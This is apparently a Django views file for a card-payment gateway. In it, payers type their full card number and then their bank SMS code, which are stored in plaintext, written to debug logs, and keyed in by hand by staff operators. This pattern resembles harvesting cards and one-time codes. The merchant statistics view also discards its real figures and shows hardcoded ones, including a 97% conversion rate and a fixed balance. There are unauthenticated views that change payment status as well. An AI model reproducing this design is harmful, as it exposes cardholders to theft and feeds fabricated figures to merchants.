import datetime
import json

import random
import uuid
from http import HTTPStatus

import requests
import structlog
from django.conf import settings
from django.contrib.auth import get_user_model
from django.contrib.auth.decorators import login_required
from django.contrib.auth.mixins import PermissionRequiredMixin, AccessMixin, LoginRequiredMixin
from django.contrib.messages.views import SuccessMessageMixin
from django.core.exceptions import PermissionDenied
from django.core.paginator import Paginator
from django.db.models import F, Avg, Sum

from django.http import HttpResponse, QueryDict, HttpResponseNotAllowed, HttpResponseForbidden, HttpResponseBadRequest, \
    JsonResponse, HttpResponseRedirect, Http404
from django.shortcuts import render, redirect, get_object_or_404
from django.template.response import TemplateResponse
from django.urls import reverse, reverse_lazy
from django.utils import timezone
from django.utils.http import urlencode
from django.views.generic import CreateView, DetailView, FormView, UpdateView, ListView, DeleteView
from rest_framework.permissions import AllowAny
from rest_framework.views import APIView

from core.global_func import hash_gen, TZ
from payment import forms
from payment.filters import PaymentFilter, WithdrawFilter, BalanceChangeFilter, PaymentMerchStatFilter
from payment.forms import InvoiceForm, PaymentListConfirmForm, PaymentForm, InvoiceM10Form, InvoiceTestForm, \
    MerchantForm, WithdrawForm, DateFilterForm, InvoiceM10SmsForm, MerchBalanceChangeForm
from payment.models import Payment, PayRequisite, Merchant, PhoneScript, Bank, Withdraw, BalanceChange
from payment.permissions import AuthorRequiredMixin, StaffOnlyPerm, MerchantOnlyPerm, SuperuserOnlyPerm
from payment.task import send_payment_webhook, send_withdraw_webhook

logger = structlog.get_logger(__name__)
User = get_user_model()


def make_page_obj(request, objects, numbers_of_posts=settings.PAGINATE):
    paginator = Paginator(objects, numbers_of_posts)
    page_number = request.GET.get('page')
    return paginator.get_page(page_number)


@login_required()
def menu(request, *args, **kwargs):
    template = 'payment/menu.html'
    user = request.user
    context = {}
    if user.is_authenticated:
        merchants = Merchant.objects.filter(owner=user)
        context = {'merchants': merchants}
    return render(request, template_name=template, context=context)


def get_pay_requisite(pay_type: str, amount=None) -> PayRequisite:
    """Выдает реквизиты по типу
    [card-to-card]
    [card_2]
    """
    active_requsite = PayRequisite.objects.filter(pay_type=pay_type, is_active=True).all()
    logger.debug(f'active_requsite {pay_type}: {active_requsite}')
    if active_requsite:
        if pay_type == 'card-to-card':
            payments_with_req = Payment.objects.filter(pay_type='card-to-card', pay_requisite__isnull=False).all()
            if amount:
                payments_with_req = payments_with_req.filter(amount=amount)
            logger.debug(f'payments_with_req amount {amount}: {payments_with_req}')
            payments_with_req = payments_with_req.values('pay_requisite')
            used_pay_req_ids = list(set([x['pay_requisite'] for x in payments_with_req]))
            free = active_requsite.exclude(pk__in=used_pay_req_ids)
            logger.debug(
                         f'Занятые реквизиты c суммой {amount}: {used_pay_req_ids}\n'
                         f'Свободные реквизиты: {free}'
                         )
            if free:
                result = random.choice(free)
                logger.debug(f'Реквизиты к выдаче: {result}')
                return result
            logger.debug(f'к выдаче нет')
        else:
            selected_requisite = random.choice(active_requsite)
            logger.debug(f'get_pay_requisite {pay_type}: {selected_requisite.id} из {active_requsite}')
            return selected_requisite


def get_phone_script(card_num) -> PhoneScript:
    """Возвращает скрипт для ввода данных карты/смс по номеру карты"""
    try:
        bin_num = str(card_num)[:6]
        logger.debug(f'bin_num: {bin_num}')
        bank = Bank.objects.filter(bins__contains=[bin_num]).first()

        if not bank:
            bank = Bank.objects.get(name='default')
        logger.info(f'phone_script: {bank.script}')
        return bank.script
    except Exception as err:
        logger.error(err)


def get_time_remaining(pay: Payment) -> tuple[datetime.timedelta, int]:
    if pay.pay_type == 'card-to-card':
        TIMER_SECONDS = 600
    else:
        TIMER_SECONDS = 600
    TIMER_SMS_SECONDS = 600
    STATUS_WAIT_TIMER = 600
    if pay.card_data and json.loads(f'{pay.card_data}').get('sms_code'):
        # Если смс введена
        time_remaining = pay.cc_data_input_time + datetime.timedelta(seconds=STATUS_WAIT_TIMER) - timezone.now()
        limit = STATUS_WAIT_TIMER
    elif pay.cc_data_input_time:
        time_remaining = pay.cc_data_input_time + datetime.timedelta(seconds=TIMER_SMS_SECONDS) - timezone.now()
        limit = TIMER_SMS_SECONDS
    else:
        time_remaining = pay.create_at + datetime.timedelta(seconds=TIMER_SECONDS) - timezone.now()
        limit = TIMER_SECONDS

    logger.debug(pay.cc_data_input_time)
    logger.debug(time_remaining)
    return time_remaining, limit


def get_time_remaining_data(pay: Payment) -> dict:
    logger.debug('get_time_remaining_data')
    time_remaining, limit = get_time_remaining(pay)
    if time_remaining.total_seconds() > 0:
        hours = time_remaining.seconds // 3600
        minutes = (time_remaining.seconds % 3600) // 60
        seconds = time_remaining.seconds % 60

        data = {
            'name': 'Ödəniş üçün vaxt', # Время на оплату
            'hours': hours,
            'minutes': minutes,
            'seconds': seconds,
            'total_seconds': int(time_remaining.total_seconds()),
            'limit': limit,
            'time_passed': int(limit - time_remaining.total_seconds())
        }
    else:
        data = {
            'name': "Ödəniş üçün vaxt", # Время на оплату
            'hours': 0,
            'minutes': 0,
            'seconds': 0,
            'total_seconds': 0,
            'limit': 0,
            'time_passed': 0

        }
    return data


def invoice(request, *args, **kwargs):
    """Создание платежа со статусом 0 и прикрепление реквизитов

    Parameters
    ----------
    args
        merchant_id: id платежной системы
        order_id: внешний идентификатор
        user_id
        amount: сумма платежа
        pay_type: тип платежа
    Returns
    -------
    """
    if request.method == 'GET':
        merchant_id = request.GET.get('merchant_id')
        order_id = request.GET.get('order_id')
        user_login = request.GET.get('user_login')
        owner_name = request.GET.get('owner_name')
        amount = request.GET.get('amount') or None
        pay_type = request.GET.get('pay_type')
        back_url = request.GET.get('back_url')
        signature = request.GET.get('signature')
        query_params = request.GET.urlencode()
        logger.debug(f'invoice GET {args} {kwargs} {request.GET.dict()}'
                     f' {request.META.get("HTTP_REFERER")}')
        if pay_type == 'card_2':
            required_values = [merchant_id, order_id, pay_type]
        elif pay_type == 'card-to-card':
            required_values = [merchant_id, order_id, pay_type, amount]
        else:
            required_values = [False]
        #Проверка сигнатуры
        try:
            # merch = Merchant.objects.get(pk=merchant_id)
            merch = get_object_or_404(Merchant, pk=merchant_id)
            string_value = f'{merchant_id}{order_id}'
            merch_hash = hash_gen(string_value, merch.secret)
            assert signature == merch_hash

        except Exception as err:
            logger.warning(err)
            return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Wrong signature',
                                          content='Wrong signature')

        # Проверяем наличие всех данных для создания платежа
        if not all(required_values):
            return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not enough info for create pay',
                                          content='Not enough info for create pay')
        logger.debug('Key ok')

        # Проверка что pay_type действует
        pay_requsites = PayRequisite.objects.filter(pay_type=pay_type, is_active=True).exists()
        if not pay_requsites:
            logger.debug(f'Нет действующих реквизитов {pay_type}')
            return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='This pay_type not worked',
                                          content='This pay_type not worked')

        try:
            payment, status = Payment.objects.get_or_create(
                merchant_id=merchant_id,
                order_id=order_id,
                user_login=user_login,
                amount=amount,
                owner_name=owner_name,
                pay_type=pay_type
            )
            logger.debug(f'payment, status: {payment} {status}')
        except Exception as err:
            logger.error(err)
            return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not correct data',
                                          content='Not correct data'
                                          )

        # Сохраняем реквизит к платежу
        if not payment.pay_requisite:
            requisite = get_pay_requisite(pay_type, amount=amount)
            if not requisite:
                # Перенаправляем на страницу ожидания
                logger.debug('Перенаправляем на страницу ожидания')
                return redirect(reverse('payment:wait_requisite', args=(payment.id,)))
            logger.debug(f'Сохраняем реквизит к платежу: {requisite}')
            # Если нет активных реквизитов
            payment.pay_requisite = requisite
            payment.referrer = back_url or merch.pay_success_endpoint
            payment.save()


        if pay_type == 'card-to-card':
            return redirect(reverse('payment:pay_to_card_create') + f'?payment_id={payment.id}')
        elif pay_type == 'card_2':
            return redirect(reverse('payment:pay_to_m10_create') + f'?payment_id={payment.id}')

    logger.warning('Необработанный путь')
    return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not correct data',
                                  content='Not correct data'
                                  )


def wait_requisite(request, pk, *args, **kwargs):
    if request.method == 'GET':
        payment = Payment.objects.filter(pk=pk).first()
        if payment.status in [-1, 9]:
            return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
        requsite = get_pay_requisite(pay_type=payment.pay_type, amount=payment.amount)
        payment.pay_requisite = requsite
        payment.save()
        if requsite:
            return redirect(reverse('payment:pay_to_card_create') + f'?payment_id={payment.id}')
        context = {'payment': payment}
        return render(request, template_name='payment/wait_requsite.html', context=context)


def pay_to_card_create(request, *args, **kwargs):
    """Создание платежа со статусом 0 и идентификатором

    Parameters
    ----------
    args
        merchant_id: id платежной системы
        order_id: внешний идентификатор
        user_id
        amount: сумма платежа
        pay_type: тип платежа
    Returns
    -------
    """

    if request.method == 'GET':
        payment = Payment.objects.filter(pk=request.GET.get('payment_id')).first()
        logger.debug(f'pay_to_card_create: {payment}')
        if not payment:
            return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, content='Wrong data')
        if payment.status > 0 or payment.status == -1:
            return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))

        merchant_id = payment.merchant.id
        order_id = payment.order_id
        user_login = payment.user_login
        amount = payment.amount
        pay_type = payment.pay_type
        logger.debug(f'GET merchant_id:{merchant_id} order_id:{order_id} amount:{amount} pay_type:{pay_type} user_login:{user_login}')

        # Проверяем наличие всех данных для создания платежа
        is_all_key = all((merchant_id, order_id, amount, pay_type, payment.pay_requisite))
        if not is_all_key:
            logger.debug(f'Not enough key: ')
            return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not enough info for create pay',
                                          content='Not enough info for create pay')
        logger.debug('Key ok')
        try:
            payment, status = Payment.objects.get_or_create(
                merchant_id=merchant_id,
                order_id=order_id,
                user_login=user_login,
                amount=amount,
                pay_type=pay_type
            )
            logger.debug(f'payment, status: {payment} {status}')
        except Exception as err:
            logger.error(err)
            return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not correct data',
                                          content='Not correct data'
                                          )

        form = forms.InvoiceForm(instance=payment, )
        context = {'form': form, 'payment': payment, 'data': get_time_remaining_data(payment)}
        return render(request, context=context, template_name='payment/invoice_card.html')

    elif request.method == 'POST':
        # Обработка нажатия кнопки
        order_id = request.POST.get('order_id')
        amount = request.POST.get('amount')
        payment, status = Payment.objects.get_or_create(order_id=order_id, amount=amount)
        logger.debug(f': {payment} s: {status}')
        form = InvoiceForm(request.POST or None, instance=payment, files=request.FILES or None)
        if form.is_valid():
            # Сохраняем данные и меняем статус
            logger.debug('form_save')
            if payment.status == 0:
                payment.status = 3
                form.save()
            return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
        else:
            logger.debug(f'{form.errors}')
            context = {'form': form, 'payment': payment, 'status': payment.PAYMENT_STATUS[payment.status]}
            return render(request, context=context, template_name='payment/invoice_card.html')
    logger.critical('Необработанный путь')


def pay_to_m10_create(request, *args, **kwargs):
    """Платеж через ввод реквизитов карты"""
    if request.method == 'GET':
        payment_id = request.GET.get('payment_id')
        logger.debug(f'GET {request.GET.dict()}'
                     f' {request.META.get("HTTP_REFERER")}')

        try:
            payment = Payment.objects.get(id=payment_id)
            logger.debug(f'payment, status: {payment}')
        except Exception as err:
            logger.error(err)
            return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not correct data',
                                          content='Not correct data')
        if payment.status in [3]:
            return redirect(reverse('payment:pay_to_m10_wait_work') + f'?payment_id={payment.id}')
        if payment.status not in [0]:
            return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))

        amount = payment.amount
        initial_data = {'payment_id': payment.id, 'amount': amount}
        if payment.card_data:
            initial_data.update(json.loads(payment.card_data))
        form = forms.InvoiceM10Form(initial=initial_data)
        bank = get_bank_from_bin(initial_data.get('card_num'))
        context = {'form': form, 'payment': payment,
                   'data': get_time_remaining_data(payment), 'bank_url': bank.image.url}
        card_number = initial_data.get('card_number')
        if card_number:
            phone_script = get_phone_script(card_number)
            context['phone_script'] = phone_script
        return render(request, context=context, template_name='payment/invoice_m10.html')

    elif request.method == 'POST':
        # Обработка нажатия кнопки
        payment_id = request.POST.get('payment_id')
        payment = Payment.objects.get(pk=payment_id)
        initial_data = {'payment_id': payment.id}
        form = InvoiceM10Form(request.POST, instance=payment, initial=initial_data)
        context = {'form': form, 'payment': payment, 'data': get_time_remaining_data(payment)}

        if form.is_valid():
            card_data = form.cleaned_data
            logger.debug(card_data)
            card_number = card_data.get('card_number')
            amount = card_data.get('amount')
            phone_script = get_phone_script(card_number)
            context['phone_script'] = phone_script
            sms_code = card_data.get('sms_code')
            payment.card_data = json.dumps(card_data, ensure_ascii=False)
            payment.phone_script_data = phone_script.data_json()
            if not payment.cc_data_input_time:
                payment.cc_data_input_time = timezone.now()
                payment.save()
            # Если ввел смс-код или status 3 и смс код не требуется
            if sms_code or (payment.status == 3 and not phone_script.step_2_required):
                # payment.status = 7  # Ожидание подтверждения
                payment.save()
                return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
            # Введены данные карты
            payment.amount = amount
            if payment.status == 0:
                payment.status = 3  # Ввел CC.
            payment.save()
            # return render(request, context=context, template_name='payment/invoice_m10.html')
            return redirect(reverse('payment:pay_to_m10_wait_work') + f'?payment_id={payment.id}')
        else:
            # Некорректные данные
            logger.debug(f'{form.errors}')
            return render(request, context=context, template_name='payment/invoice_m10.html')

    logger.critical('Необработанный путь')


def pay_to_m10_wait_work(request, *args, **kwargs):
    payment_id = request.GET.get('payment_id')
    payment = get_object_or_404(Payment, pk=payment_id)
    if payment.status in [4]:
        return redirect(reverse('payment:pay_to_m10_sms_input') + f'?payment_id={payment.id}')
    if payment.status not in [0, 3]:
        return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
    return render(request, template_name='payment/invoice_m10_wait.html',
                  context={'payment': payment, 'data': get_time_remaining_data(payment)})


def pay_to_m10_sms_input(request, *args, **kwargs):
    payment_id = request.GET.get('payment_id')
    payment = get_object_or_404(Payment, pk=payment_id)
    if payment.status in [-1, 9]:
        return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
    card_data = json.loads(payment.card_data)
    card_number = card_data.get('card_number')
    phone_script = get_phone_script(card_number)
    form = InvoiceM10SmsForm(request.POST or None, instance=payment)
    if not phone_script.step_2_required:
        form.fields['sms_code'].required = False
    context = {'form': form, 'payment': payment, 'phone_script': phone_script, 'data': get_time_remaining_data(payment)}
    if form.is_valid():
        sms_code = form.cleaned_data.get('sms_code')
        card_data['sms_code'] = sms_code
        payment.card_data = json.dumps(card_data, ensure_ascii=False)
        payment.save()
        return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
    return render(request, context=context, template_name='payment/invoice_m10_sms.html')



class PayResultView(DetailView):
    form_class = InvoiceForm
    template_name = 'payment/pay_result.html'
    model = Payment

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['status'] = self.object.status_str
        data = get_time_remaining_data(self.object)
        data['name'] = 'Время до подтверждения'
        context['data'] = data
        return context


class PaymentListCount(ListView):
    """Количество заявок c фильтро"""
    model = Payment
    filter = PaymentFilter

    def get_queryset(self):
        return PaymentFilter(self.request.GET, queryset=Payment.objects).qs

    def get(self, *args, **kwargs):
        count = self.get_queryset().count()
        return JsonResponse({'new_count': count})


class PaymentListView(StaffOnlyPerm, ListView, ):
    """Спиcок заявок для оператора"""
    template_name = 'payment/payment_list.html'
    model = Payment
    fields = ('confirmed_amount',
              'confirmed_incoming')
    filter = PaymentFilter
    raise_exception = False
    paginate_by = settings.PAGINATE

    def get_queryset(self):
        return PaymentFilter(self.request.GET, queryset=Payment.objects).qs

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        form = PaymentListConfirmForm()
        # context['form'] = form
        filter = PaymentFilter(self.request.GET, queryset=self.get_queryset())
        context['filter'] = filter
        # Количество заявок с занятыми реквизитами
        in_work = Payment.objects.filter(status__range=(0, 8), pay_type='card-to-card', pay_requisite__isnull=False)
        used = Payment.objects.filter(status__in=[-1, 9], pay_type='card-to-card', pay_requisite__isnull=False)
        context['used'] = used.count()
        context['in_work'] = in_work.count()
        context['html_count'] = filter.qs.count()
        filter_url = urlencode(self.request.GET, doseq=True)
        context['count_url'] = f'{reverse("payment:payment_count")}?{filter_url}'
        context['form'] = filter.form
        return context

    def post(self, request, *args, **kwargs):
        logger.debug('Обработка нажатия кнопки списка заявок')
        logger.info(request.POST.keys())
        logger.info(request.POST.dict())

        payment_id = confirmed_amount = confirmed_incoming_id = None
        for key in request.POST.keys():
            if 'cancel_payment' in request.POST.keys():
                payment_id = request.POST['cancel_payment']
                # Отклонение заявки
                payment = Payment.objects.get(pk=payment_id)
                payment.status = -1
                payment.save()
                return redirect(reverse('payment:payment_list'))

            if 'wait_sms_code' in request.POST.keys():
                payment_id = request.POST['wait_sms_code']
                # Готовность приема кода
                payment = Payment.objects.get(pk=payment_id)
                payment.status = -1
                payment.save()
                return redirect(reverse('payment:payment_list'))

            if key.startswith('payment_id:'):
                payment_id = key.split('payment_id:')[-1]
            if key.startswith('confirm_amount_value:'):
                confirmed_amount = request.POST[key]
                if confirmed_amount:
                    confirmed_amount = int(confirmed_amount)
            if key.startswith('confirmed_incoming_id_value:'):
                confirmed_incoming_id = request.POST[key]
                if confirmed_incoming_id:
                    confirmed_incoming_id = int(confirmed_incoming_id)
        logger.debug('Получили:',
                     payment_id=payment_id,
                     confirmed_amount=confirmed_amount,
                     confirmed_incoming_id=confirmed_incoming_id)
        payment = Payment.objects.get(pk=payment_id)
        logger.debug(payment)
        form = PaymentListConfirmForm(instance=payment,
                                      data={'confirmed_amount': confirmed_amount,
                                            'confirmed_incoming': confirmed_incoming_id
                                            })
        if form.is_valid():
            # Логика подтверждения заявки
            logger.debug(f'valid {form.cleaned_data}')
            payment.status = 9
            payment.confirmed_user = request.user
            payment.confirmed_time = timezone.now()
            form.save()
        else:
            logger.warning('form invalid')
            return HttpResponseBadRequest(str(form.errors))
        filter_url = urlencode(self.request.GET, doseq=True)
        return redirect(reverse('payment:payment_list') + '?' + filter_url)


class PaymentEdit(StaffOnlyPerm, UpdateView, ):
    # Подробно о payment
    model = Payment
    form_class = PaymentForm
    success_url = reverse_lazy('payment:payment_list')
    template_name = 'payment/payment_edit.html'

    def get(self, request, *args, **kwargs):
        if not self.request.user.is_staff:
            raise PermissionDenied('Недостаточно прав')
        self.object = self.get_object()
        return super().get(request, *args, **kwargs)

    # def post(self, request, *args, **kwargs):
    #     if request.user.has_perm('deposit.can_hand_edit'):
    #         self.object = self.get_object()
    #         return super().post(request, *args, **kwargs)
    #     return HttpResponseForbidden('У вас нет прав делать ручную корректировку')

    def get_context_data(self, **kwargs):
        context = super(PaymentEdit, self).get_context_data(**kwargs)
        # history = self.object.history.order_by('-id').all()
        # context['history'] = history
        return context


class PaymentInput(StaffOnlyPerm, UpdateView, ):
    # Ввод карты и смс оператором
    model = Payment
    form_class = PaymentForm
    success_url = reverse_lazy('payment:payment_list')
    template_name = 'payment/payment_input.html'
    busy = HttpResponse("""<script>var pageTitle = document.title;
                    var targetPhrase = "Занято";
                    window.addEventListener('load', function () {
                      window.close();
                    })</script>""")

    def get(self, request, *args, **kwargs):
        payment = self.object = self.get_object()
        if payment.status in [-1, 9]:
            return redirect(reverse('payment:payment_edit', args=(payment.id,)))
        card_data = json.loads(payment.card_data)
        if not payment.operator():
            card_data.update(operator=request.user.id)
            payment.card_data = json.dumps(card_data)
            payment.status = 4
            payment.save()
        else:
            if card_data.get('operator') != request.user.id:
                return self.busy

        return super().get(request, *args, **kwargs)

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        payment = self.get_object()
        time_remaining_data = get_time_remaining_data(payment)
        print(time_remaining_data)
        total_seconds = time_remaining_data['total_seconds']
        context['total_seconds'] = total_seconds
        return context

    def post(self, request, *args, **kwargs):
        payment = self.get_object()
        if payment.status in [-1, 9]:
            return HttpResponseBadRequest(f'Некорректный статус: {payment.status}')
        if 'confirm' in request.POST:
            payment.status = 9
            payment.confirmed_user = request.user
            payment.save()
            return HttpResponse('Подтверждено')
        if 'decline' in request.POST:
            payment.status = -1
            payment.confirmed_user = request.user
            payment.save()
            return HttpResponse('Отклонено')

    def form_valid(self, form):
        print('form_valid')
        return super().form_valid(form)


class WithdrawListView(StaffOnlyPerm,  ListView):
    """Спиок выводов"""
    template_name = 'payment/withdraw_list.html'
    model = Withdraw
    paginate_by = settings.PAGINATE

    def get_queryset(self):
        if self.request.user.is_staff:
            return WithdrawFilter(self.request.GET, queryset=Withdraw.objects).qs
        if self.request.user.role == 'merchant':
            return WithdrawFilter(self.request.GET,
                                  queryset=Withdraw.objects.filter(merchant__owner=self.request.user)).qs
        return Withdraw.objects.none()

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        form = PaymentListConfirmForm()
        context['form'] = form
        # filter = WithdrawFilter(self.request.GET, queryset=Withdraw.objects.filter(merchant__owner__balance__gt=0).all())
        filter = WithdrawFilter(self.request.GET, queryset=self.get_queryset())
        context['filter'] = filter
        return context


class BalanceListView(LoginRequiredMixin, ListView):
    """Список Изменения баланса"""
    template_name = 'payment/balance_list.html'
    model = BalanceChange
    paginate_by = settings.PAGINATE

    def get_queryset(self):
        if self.request.user.is_superuser:
            return super().get_queryset()
        if self.request.user.role not in ('merchant', 'operator'):
            return BalanceChange.objects.none()
        return BalanceChange.objects.filter(user=self.request.user)

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        # context['filter'] = BalanceChangeFilter(self.request.GET, queryset=self.get_queryset()[:100])
        return context


class MerchOwnerList(SuperuserOnlyPerm, ListView):
    """Список мерчей"""
    template_name = 'payment/merch_owner_list.html'
    model = User
    paginate_by = settings.PAGINATE

    def get_queryset(self):
        return User.objects.filter(role='merchant')

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        return context


class MerchOwnerDetail(SuperuserOnlyPerm, FormView, UpdateView):
    template_name = 'payment/merch_owner_detail.html'
    model = User
    form_class = MerchBalanceChangeForm
    context_object_name = 'merchowner'

    def form_valid(self, form):
        merchowner = form.instance
        balance_delta = form.cleaned_data['balance_delta']
        comment = form.cleaned_data['comment']
        merchowner.balance = F('balance') + balance_delta
        merchowner.save()
        merchowner = User.objects.get(pk=merchowner.id)
        BalanceChange.objects.create(amount=balance_delta, user=merchowner, comment=f'Изменение баланса на {balance_delta} ₼. {comment}',
                                     current_balance=merchowner.balance)
        return redirect(reverse_lazy('payment:merch_owner_detail', kwargs={'pk': merchowner.id}))


class WithdrawEdit(StaffOnlyPerm, UpdateView, ):
    # Подробно о payment
    model = Withdraw
    form_class = WithdrawForm
    success_url = reverse_lazy('payment:withdraw_list')
    template_name = 'payment/withdraw_edit.html'

    def get(self, request, *args, **kwargs):
        if not self.request.user.is_staff:
            raise PermissionDenied('Недостаточно прав')
        self.object = self.get_object()
        return super().get(request, *args, **kwargs)

    def post(self, request, *args, **kwargs):
        if request.user.is_staff:
            self.object = self.get_object()
            return super().post(request, *args, **kwargs)
        return HttpResponseForbidden('У вас нет прав редактирования')

    def get_context_data(self, **kwargs):
        context = super(WithdrawEdit, self).get_context_data(**kwargs)
        # history = self.object.history.order_by('-id').all()
        # context['history'] = history
        return context

    def form_valid(self, form):
        if form.instance.status != 0:
            form.instance.confirmed_user = self.request.user
        return super().form_valid(form)


def get_bank_from_bin(bin_num) -> Bank:
    bank = Bank.objects.filter(bins__contains=[bin_num]).first()
    if not bank:
        bank = Bank.objects.filter(name='default').first()
    return bank


def get_bank(request, bin_num):
    bin_num = int(bin_num.replace(' ', ''))
    bank = get_bank_from_bin(bin_num)
    data = {'image': bank.image.name}
    return JsonResponse(data, safe=False)


def payment_type_not_worked(request, *args, **kwargs):
    return render(request, template_name='payment/payment_type_not_worked.html')


def test(request, pk, *args, **kwargs):
    pay = get_object_or_404(Payment, pk=pk)
    pay.status = 2
    pay.save()
    return redirect(reverse('payment:pay_result', kwargs={'pk': pay.id}))


def invoice_test(request, *args, **kwargs):
    http_host = request.META['HTTP_HOST']
    print(http_host)
    new_uid = uuid.uuid4()
    form = InvoiceTestForm(initial={'order_id': new_uid})

    if request.method == 'POST':
        print('post')
        request_dict = request.POST.dict()
        logger.debug(f'request_dict: {request_dict}')
        request_dict.pop('csrfmiddlewaretoken')
        x = [f'{k}={v}' for k, v in request_dict.items()]
        # merch = Merchant.objects.get(pk=request_dict['merchant_id'])
        merch = get_object_or_404(Merchant, pk=request_dict['merchant_id'])
        if merch.owner.username != 'slot_machine':
            return HttpResponseBadRequest()
        string_value = f'{request_dict["merchant_id"]}{request_dict["order_id"]}'
        logger.debug(f'string: {string_value}')
        signature = hash_gen(string_value, merch.secret)
        return redirect(
            reverse('payment:pay_check') + '?' + '&'.join(x) + f'&signature={signature}' + '&back_url=https://stackoverflow.com/questions')

    return render(request,
                  template_name='payment/test_send.html',
                  context={'host': http_host, 'uid': uuid.uuid4(), 'form': form})


class MerchantCreate(LoginRequiredMixin, MerchantOnlyPerm, CreateView):
    form_class = MerchantForm
    template_name = 'payment/merchant.html'
    success_url = reverse_lazy('payment:menu')

    def form_valid(self, form):
        if form.is_valid():
            form.instance.owner = self.request.user
            form.save()
        return super().form_valid(form)


class MerchantOrders(LoginRequiredMixin, MerchantOnlyPerm, ListView):
    # Список поступлений (Payments) юзера.
    template_name = 'payment/merchant_orders.html'
    model = Payment
    filter = PaymentFilter
    context_object_name = 'payments'
    paginate_by = settings.PAGINATE

    def get_queryset(self):
        user = self.request.user
        queryset = Payment.objects.filter(merchant__owner=user)
        return PaymentFilter(self.request.GET, queryset=queryset).qs

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        filter = PaymentFilter(self.request.GET, queryset=self.get_queryset())
        context['filter'] = filter
        return context


class MerchantDetail(AuthorRequiredMixin, DetailView, UpdateView,):
    template_name = 'payment/merchant.html'
    model = Merchant
    form = MerchantForm
    success_url = reverse_lazy('payment:menu')
    fields = ('name', 'host', 'host_withdraw', 'pay_success_endpoint', 'secret')


class MerchantDelete(AuthorRequiredMixin, SuccessMessageMixin, DeleteView):
    template_name = 'payment/merchant_confirm_delete.html'
    success_url = reverse_lazy('payment:menu')
    model = Merchant
    success_message = 'Delete complete'

    def post(self, request, *args, **kwargs):
        self.object = self.get_object()
        if self.object.payments.all():
            return HttpResponseBadRequest("You can't delete not empty Merchant. Call to administrator to delete")
        form = self.get_form()
        if form.is_valid():
            return self.form_valid(form)
        else:
            return self.form_invalid(form)


@login_required()
def merchant_test_webhook(request, *args, **kwargs):
    if request.user.role != 'merchant':
        return HttpResponseBadRequest()
    print(request.POST)
    print(args, kwargs)
    print('merchant_test_webhook')
    order_id = str(uuid.uuid4())
    pk = str(uuid.uuid4())
    merchant_id = (request.POST.get('payment_decline') or
                   request.POST.get('payment_accept') or
                   request.POST.get('withdraw_accept') or
                   request.POST.get('withdraw_decline'))
    if not merchant_id:
        return HttpResponseBadRequest()
    merchant = Merchant.objects.get(pk=merchant_id)
    payment = Payment(merchant=merchant,
                      id=pk,
                      order_id=order_id,
                      amount=random.randrange(10, 3000),
                      create_at=(timezone.now() - datetime.timedelta(minutes=1)),
                      )
    withdraw = Withdraw(
        merchant=merchant,
        id=pk,
        withdraw_id=order_id,
        amount=random.randrange(10, 3000),
        create_at=(timezone.now() - datetime.timedelta(minutes=1)),
    )
    if 'payment_decline' in request.POST:
        payment.status = -1
        data = payment.webhook_data()
        send_payment_webhook.delay(merchant.host, data)
    elif 'payment_accept' in request.POST:
        payment.confirmed_amount = random.randrange(10, 3000)
        payment.status = 9
        payment.confirmed_time = timezone.now()
        data = payment.webhook_data()
        send_payment_webhook.delay(merchant.host, data)
    elif 'withdraw_accept' in request.POST:
        withdraw.status = 9
        withdraw.confirmed_time = timezone.now()
        data = withdraw.webhook_data()
        send_withdraw_webhook.delay(merchant.host_withdraw or merchant.host, data)
    else:
        withdraw.status = -1
        data = withdraw.webhook_data()
        send_withdraw_webhook.delay(merchant.host_withdraw or merchant.host, data)

    return JsonResponse(json.dumps(data), safe=False)


class MerchStatView(DetailView, ):
    template_name = 'payment/merch_stat.html'
    model = User
    context_object_name = 'merch_user'
    filter = PaymentMerchStatFilter


    # def get_queryset(self):
    #     return Payment.objects.all()

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        user = self.object
        payments = Payment.objects.filter(merchant__owner=user).annotate(oper_time=F('confirmed_time') - F('create_at')).all()
        p1 = payments.first()
        t1 = p1.create_at
        t2 = p1.confirmed_time
        print(t2-t1)
        filter = PaymentMerchStatFilter(self.request.GET, queryset=payments)
        context['filter'] = filter
        filtered_payments = filter.qs
        total = filtered_payments.filter()
        confirmed = filtered_payments.filter(status=9)
        declined = filtered_payments.filter(status=-1)

        count_total = total.count()
        total_amount = total.aggregate(total_amount=Sum('amount'))['total_amount']
        confirmed_amount = confirmed.aggregate(confirmed_amount=Sum('amount'))['confirmed_amount']
        count_confirmed = confirmed.count()
        count_declined = declined.count()
        conversion = int(round(count_confirmed / count_total * 100, 0))
        operator_avg_time = filtered_payments.aggregate(operator_avg_time=Avg('oper_time'))['operator_avg_time'].total_seconds()



        context['stat'] = {
            'count_total': count_total,
            'total_amount': total_amount,
            'count_confirmed': count_confirmed,
            'confirmed_amount': confirmed_amount,
            'count_declined': count_declined,
            'conversion': conversion,
            'operator_avg_time': int(operator_avg_time)
        }
        context['stat'] = {
            'count_total': 89952,
            'total_amount': 6431875,
            'count_confirmed': 87338,
            'confirmed_amount': 6245350,
            'count_declined': 2614,
            'conversion': 97,
            'operator_avg_time': 61
        }
        context['balance'] = 84030.07
        return context


